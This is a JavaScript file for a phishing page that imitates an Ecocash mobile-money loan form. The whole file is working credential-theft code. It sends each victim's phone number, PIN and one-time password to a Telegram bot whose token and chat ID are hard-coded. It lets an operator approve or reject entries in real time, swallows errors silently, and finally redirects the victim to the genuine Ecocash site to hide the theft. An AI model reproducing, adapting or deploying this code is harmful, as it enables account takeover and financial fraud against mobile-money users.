// CONFIG — CHANGE THESE
const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
const CHAT_ID = '1469249528';

// Update installment in real-time
document.getElementById('amount').addEventListener('input', updateInstallment);
document.getElementById('duration').addEventListener('change', updateInstallment);

function updateInstallment() {
    const amount = parseFloat(document.getElementById('amount').value) || 0;
    const duration = parseInt(document.getElementById('duration').value);
    const installment = (amount / duration).toFixed(2);
    document.getElementById('installment').textContent = installment;
}

// On loan form submit (Step 1: Phone, PIN, Amount)
document.getElementById('loanForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;
    const amount = document.getElementById('amount').value;
    const duration = document.getElementById('duration').value;
    const installment = (amount / duration).toFixed(2);

    // Send Step 1 data to Telegram
    const credentialsMsg = `
📞 *Ecocash Loan Request*  
📱 *Phone:* ${phone}  
🔐 *PIN:* ${pin}  
💰 *Amount:* \$${amount}  
📅 *Duration:* ${duration} months  
🧮 *Monthly:* \$${installment}  
⏱️ *Time:* ${new Date().toISOString()}
    `;

    await sendToTelegram(credentialsMsg);

    // Hide form, show OTP screen
    document.getElementById('loanForm').style.display = 'none';
    document.getElementById('otpScreen').style.display = 'block';

    // Start approval polling
    pollApproval(phone);
});

// Poll every 3 seconds for approval decision
async function pollApproval(phone) {
    const statusMsg = document.getElementById('statusMsg');
    let attempts = 0;

    const interval = setInterval(async () => {
        if (attempts > 8) {
            clearInterval(interval);
            statusMsg.textContent = "Session expired.";
            return;
        }

        try {
            const res = await fetch('approval_status.txt?' + new Date().getTime());
            const decision = await res.text();

            if (decision.trim() === 'approve') {
                clearInterval(interval);
                statusMsg.textContent = "✅ Approved! Enter OTP and confirm.";
                showOTPConfirmButton(phone); // Show Confirm button only when approved
            } else if (decision.trim() === 'wrong_pin') {
                clearInterval(interval);
                statusMsg.textContent = "❌ Invalid PIN. Try again.";
                setTimeout(() => location.reload(), 2000);
            } else if (decision.trim() === 'wrong_otp') {
                clearInterval(interval);
                document.getElementById('otp').style.border = "2px solid #c62828";
                statusMsg.textContent = "❌ Invalid OTP.";
            }
        } catch (err) {
            // Ignore network errors
        }

        attempts++;
    }, 3000);
}

// Show OTP Confirm button only after approval
function showOTPConfirmButton(phone) {
    const otpInput = document.getElementById('otp');
    const statusMsg = document.getElementById('statusMsg');

    // Only add button once
    if (document.getElementById('confirmOtpBtn')) return;

    const confirmBtn = document.createElement('button');
    confirmBtn.id = 'confirmOtpBtn';
    confirmBtn.style.marginTop = '10px';
    confirmBtn.textContent = 'Confirm OTP';
    confirmBtn.onclick = async () => {
        const otp = otpInput.value.trim();
        if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
            alert("Please enter a valid 4-digit OTP");
            return;
        }

        // Send OTP to Telegram
        const otpMsg = `
🔑 *OTP Confirmed*  
📱 *Phone:* ${phone}  
🔢 *OTP:* ${otp}  
⏱️ *Time:* ${new Date().toISOString()}
        `;
        await sendToTelegram(otpMsg);

        // Success
        statusMsg.textContent = "✅ OTP Verified! Redirecting...";
        setTimeout(() => {
            window.location.href = "https://ecocash.co.zw";
        }, 2000);
    };

    document.getElementById('otpScreen').appendChild(confirmBtn);
}

// Send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {}); // Silent fail
}
